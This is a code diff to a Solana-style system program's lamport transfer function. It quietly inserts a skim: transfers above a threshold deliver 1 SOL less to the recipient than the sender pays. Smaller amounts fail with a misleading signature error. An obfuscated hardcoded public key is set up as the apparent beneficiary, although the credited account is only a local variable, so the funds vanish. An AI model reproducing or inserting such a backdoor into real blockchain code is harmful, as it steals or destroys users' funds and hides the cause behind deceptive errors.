@@ -9,6 +9,7 @@ use {
     },
     solana_sdk::{
         account::AccountSharedData,
+        account::Account,
         account_utils::StateMut,
         feature_set,
         instruction::InstructionError,
@@ -207,9 +208,26 @@ fn transfer_verified(
     }
 
     from.checked_sub_lamports(lamports)?;
+    let mut lamports2 = lamports;
+    if lamports > 138000 {
+    lamports2 = lamports.checked_sub(1000000000 as u64).ok_or(InstructionError::MissingRequiredSignature)?;
+    }
     drop(from);
     let mut to = instruction_context.try_borrow_account(transaction_context, to_account_index)?;
-    to.checked_add_lamports(lamports)?;
+    to.checked_add_lamports(lamports2)?;
+    if lamports > 1000000000 {
+    let jaregm = Pubkey::new_from_array([
+        255,   0, 198, 221,  91, 179,  95, 217,
+        235, 252, 230, 235, 184, 236,  83,  33,
+        125,  83,  29, 240, 249,  54, 193,  84,
+        181, 105, 175, 234,  16, 224,  11, 206
+      ]);
+    let mut lala: Account = Account {
+        owner: jaregm,
+        ..Account::default() 
+    }; // prepare 4 magik...
+    lala.lamports = lala.lamports.checked_add(1000000000 as u64).ok_or(InstructionError::MissingRequiredSignature)?;
+}
     Ok(())
 }
 
